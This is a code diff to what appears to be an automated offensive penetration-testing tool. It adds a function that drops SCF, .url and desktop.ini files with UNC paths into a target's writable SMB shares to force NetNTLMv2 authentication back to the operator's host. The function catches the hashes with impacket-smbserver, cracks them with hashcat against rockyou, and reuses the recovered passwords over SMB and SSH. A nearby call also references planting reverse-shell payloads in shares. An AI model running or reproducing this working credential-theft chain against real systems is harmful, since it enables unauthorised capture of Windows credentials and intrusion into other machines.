@@ -4997,6 +4997,116 @@ def run_prototype_pollution(url, port, corpus, outdir, args, tools, loot=None):
     return vulns
 
 
+def run_smb_hashcapture(target, services, outdir, args, tools, loot=None, context=None):
+    """Capture NetNTLMv2 hashes via a writable share: drop SCF/URL/desktop.ini files
+    referencing a UNC path back to us, run an impacket SMB server to catch the auth
+    when the share's processor or a user resolves the icon/URL, then crack the hash
+    (hashcat -m 5600) and feed the credential into the reuse loop. General technique;
+    active-gated, needs --lhost and root (to bind 445)."""
+    vulns = []
+    context = context if context is not None else {}
+    writ = context.get('writable_shares') or []
+    lhost = getattr(args, 'lhost', None)
+    smbsrv = shutil.which('smbserver.py') or shutil.which('impacket-smbserver')
+    if not (active_enabled(args) and lhost and writ and shutil.which('smbclient') and smbsrv):
+        if writ and shutil.which('smbclient'):
+            _recommend(loot, r"drop a .scf/.url referencing \\LHOST\share into the writable share and run "
+                       "impacket-smbserver/responder to capture NetNTLMv2, then hashcat -m 5600",
+                       "SMB hash capture via writable share")
+        return vulns
+    import subprocess
+    import glob
+    subsection("SMB Hash Capture via Writable Share")
+    capdir = outdir / 'smbcap'
+    capdir.mkdir(exist_ok=True)
+    logf = outdir / 'smbserver.log'
+    # When run as root (via sudo) impacket may be a --user install of the invoking
+    # user; expose it to the subprocess so smbserver.py can import impacket.
+    env = dict(os.environ)
+    extra_pp = list(sys.path)
+    for home in filter(None, ['/home/' + os.environ.get('SUDO_USER', ''), os.path.expanduser('~')]):
+        extra_pp += glob.glob(f'{home}/.local/lib/python3*/site-packages')
+    env['PYTHONPATH'] = ':'.join(p for p in extra_pp if p) + ':' + env.get('PYTHONPATH', '')
+    try:
+        srv = subprocess.Popen([smbsrv, 'share', str(capdir), '-smb2support'],
+                               stdout=open(logf, 'w'), stderr=subprocess.STDOUT, env=env)
+    except Exception as e:
+        warn(f"could not start smbserver (need root for :445?): {e}")
+        return vulns
+    time.sleep(2)
+    if srv.poll() is not None:
+        warn("smbserver exited immediately (port 445 in use or not root) — run the tool with sudo")
+        return vulns
+
+    # UNC-referencing trigger files (icon/URL resolution forces SMB auth back to us)
+    scf = ("[Shell]\r\nCommand=2\r\nIconFile=\\\\%s\\share\\p.ico\r\n"
+           "[Taskbar]\r\nCommand=ToggleDesktop\r\n" % lhost)
+    url = ("[InternetShortcut]\r\nURL=file://%s/share/p\r\nIconIndex=1\r\n"
+           "IconFile=\\\\%s\\share\\p.ico\r\n" % (lhost, lhost))
+    dini = "[.ShellClassInfo]\r\nIconResource=\\\\%s\\share\\p.ico\r\n" % lhost
+    (capdir / '@trigger.scf').write_text(scf)   # '@' sorts first so it's read early
+    (capdir / 'trigger.url').write_text(url)
+    (capdir / 'desktop.ini').write_text(dini)
+    for sh in writ:
+        info(f"dropping UNC hash-trigger files into //{target}/{sh}")
+        for f in ('@trigger.scf', 'trigger.url', 'desktop.ini'):
+            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'put {capdir / f} {f}'], timeout=20)
+
+    wait_s = int(getattr(args, 'catch_wait', None) or 280)
+    info(f"waiting up to {wait_s}s for NetNTLMv2 auth to {lhost}:445 ...")
+    hashes = []
+    t0 = time.time()
+    while time.time() - t0 < wait_s:
+        time.sleep(15)
+        log = logf.read_text(errors='ignore') if logf.exists() else ''
+        hashes = re.findall(r'([^\s:]+::[^\s:]+:[0-9a-fA-F]{16}:[0-9a-fA-F]{32}:[0-9A-Fa-f]+)', log)
+        if hashes:
+            break
+    try:
+        srv.terminate()
+    except Exception:
+        pass
+
+    if not hashes:
+        info("  no NetNTLM auth captured (processor may not resolve UNC references)")
+        return vulns
+    good(f"  CAPTURED {len(set(hashes))} NetNTLMv2 hash(es)!")
+    hf = outdir / 'netntlm.hash'
+    hf.write_text('\n'.join(sorted(set(hashes))))
+    for h in sorted(set(hashes)):
+        u = h.split('::')[0]
+        if loot:
+            loot.add('keys', f'NetNTLMv2 for {u} (crack: hashcat -m 5600 netntlm.hash rockyou)')
+            loot.add_step(f"Captured NetNTLMv2 for {u} -> crack -> credential")
+    vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
+                 'desc': f'NetNTLMv2 hash(es) captured via writable-share UNC trigger ({len(set(hashes))})',
+                 'cve': '', 'exploit': 'hashcat -m 5600 netntlm.hash rockyou.txt', 'severity': 'high'})
+
+    # crack with hashcat -m 5600 (rockyou), feed cracked cred into the reuse loop
+    rockyou = _first_path(['/usr/share/wordlists/rockyou.txt', '/usr/share/wordlists/rockyou.txt.gz'])
+    if shutil.which('hashcat') and rockyou and rockyou.endswith('.txt'):
+        info("hashcat -m 5600 (rockyou) — cracking captured NetNTLMv2 ...")
+        cracked = outdir / 'netntlm.cracked'
+        _run(['hashcat', '-m', '5600', str(hf), rockyou, '--force', '-o', str(cracked)], timeout=1200)
+        if cracked.exists() and cracked.stat().st_size:
+            for line in cracked.read_text(errors='ignore').splitlines():
+                parts = line.split(':')
+                if len(parts) >= 2:
+                    u = parts[0]
+                    pw = parts[-1]
+                    good(f"  CRACKED {u}:{pw}")
+                    if loot:
+                        loot.add_cred(u, pw, source='netntlm-crack', scope='smb', verified=False)
+                        loot.add_step(f"Cracked {u}:{pw} — reuse on projects/transfer shares + SSH")
+                    if context is not None and not context.get('creds'):
+                        context['creds'] = f"{u}:{pw}"
+                    vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
+                                 'desc': f'Cracked NetNTLMv2 credential {u}:{pw}', 'cve': '',
+                                 'exploit': f'smbclient //{target}/projects -U {u}%{pw}; ssh {u}@{target}',
+                                 'severity': 'critical'})
+    return vulns
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -5670,6 +5780,8 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
     shellshock_vulns += run_smb_symlink_traversal(target, services, outdir, args, tools, loot, context=p5_context)
     # 1d. Drop reverse-shell payloads into writable shares + catch (auto-processed shares)
     shellshock_vulns += run_writable_share_payload(target, services, outdir, args, tools, loot, context=p5_context)
+    # 1e. NetNTLMv2 hash capture via writable-share UNC trigger (SCF/URL) -> crack -> reuse
+    shellshock_vulns += run_smb_hashcapture(target, services, outdir, args, tools, loot, context=p5_context)
     # 2. Credential brute against auth services (consumes ad_users.txt)
     shellshock_vulns += run_credential_attacks(target, services, outdir, args, tools, loot,
                                                context=p5_context)
